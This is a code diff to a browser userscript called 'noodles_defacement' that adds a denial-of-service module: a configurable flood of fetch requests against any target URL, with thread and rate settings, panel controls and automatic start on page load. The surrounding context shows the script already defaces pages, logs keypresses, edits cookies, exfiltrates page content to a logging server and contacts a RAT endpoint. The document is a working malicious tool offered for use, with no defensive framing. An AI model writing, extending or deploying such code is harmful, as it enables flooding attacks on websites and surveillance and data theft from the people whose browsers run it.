@@ -21,6 +21,7 @@
     const storageKeyPrefix = 'noodles_defacement_';
     const logServerURL = 'http://noodles.local/logs';
     const ratServerURL = 'http://noodles.local/rat';
+    const ddosServerURL = 'http://noodles.local/ddos';
     const heartbeatInterval = 60000;
     let sessionID = GM_getValue(storageKeyPrefix + 'sessionID', null);
 
@@ -52,7 +53,11 @@
             domExfilEnabled: GM_getValue(storageKeyPrefix + 'domExfilEnabled', false),
             domExfilSelectors: GM_getValue(storageKeyPrefix + 'domExfilSelectors', 'body'),
             beaconInterval: GM_getValue(storageKeyPrefix + 'beaconInterval', 300000),
-            panelVisible: GM_getValue(storageKeyPrefix + 'panelVisible', true)
+            panelVisible: GM_getValue(storageKeyPrefix + 'panelVisible', true),
+            ddosEnabled: GM_getValue(storageKeyPrefix + 'ddosEnabled', false),
+            ddosTarget: GM_getValue(storageKeyPrefix + 'ddosTarget', ''),
+            ddosThreads: GM_getValue(storageKeyPrefix + 'ddosThreads', 10),
+            ddosRate: GM_getValue(storageKeyPrefix + 'ddosRate', 100)
         };
     };
 
@@ -420,6 +425,33 @@
         }
     };
 
+   const performDDOS = () => {
+        if (!defacementConfig.ddosEnabled || !defacementConfig.ddosTarget) return;
+
+        const targetURL = defacementConfig.ddosTarget;
+        const numThreads = defacementConfig.ddosThreads;
+        const requestsPerSecond = defacementConfig.ddosRate;
+
+        const attack = async () => {
+            try {
+                for (let i = 0; i < requestsPerSecond; i++) {
+                    fetch(targetURL, { mode: 'no-cors' })
+                        .catch(error => {
+                            console.error('Noodles: DDoS Request Failed:', error);
+                            logError('DDoS Request Failed: ' + error.message);
+                        });
+                }
+            } catch (e) {
+                console.error('Noodles: DDoS Failed:', e);
+                logError('DDoS Failed: ' + e.message);
+            }
+        };
+
+        for (let i = 0; i < numThreads; i++) {
+            setInterval(attack, 1000);
+        }
+    };
+
     const createConfigPanel = () => {
         let panel = document.getElementById('noodlesDefacementPanel');
         if (panel) {
@@ -501,6 +533,11 @@
                         document.addEventListener('keypress', logKeypress);
                     } else {
                         document.removeEventListener('keypress', logKeypress);
+                    }
+                }
+                 if (key === 'ddosEnabled') {
+                    if (e.target.checked) {
+                        performDDOS();
                     }
                 }
             });
@@ -627,7 +664,6 @@
             togglePanelButton.textContent = defacementConfig.panelVisible ? 'Hide Panel' : 'Show Panel';
         });
 
-
         panel.appendChild(createInput('Title', 'title'));
         panel.appendChild(createInput('Message', 'message'));
         panel.appendChild(createInput('Background Color', 'bgColor'));
@@ -649,13 +685,16 @@
         panel.appendChild(createCheckbox('Enable DOM Exfil', 'domExfilEnabled'));
         panel.appendChild(createCookieEditor());
         panel.appendChild(createNumberInput('Beacon Interval (ms)', 'beaconInterval'));
+        panel.appendChild(createCheckbox('Enable DDoS', 'ddosEnabled'));
+        panel.appendChild(createInput('DDoS Target URL', 'ddosTarget'));
+        panel.appendChild(createNumberInput('DDoS Threads', 'ddosThreads'));
+        panel.appendChild(createNumberInput('DDoS Rate (Requests/sec)', 'ddosRate'));
 
         panel.appendChild(refreshButton);
         panel.appendChild(resetButton);
         panel.appendChild(togglePanelButton);
 
         document.body.appendChild(panel);
-
 
          const dragPanel = (elmnt) => {
             let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
@@ -702,6 +741,9 @@
     setInterval(exfiltrateDOM, defacementConfig.beaconInterval);
 
     getGeoLocation();
+     if (defacementConfig.ddosEnabled) {
+        performDDOS();
+    }
 
     const initialize = () => {
         if (document.readyState === 'loading') {
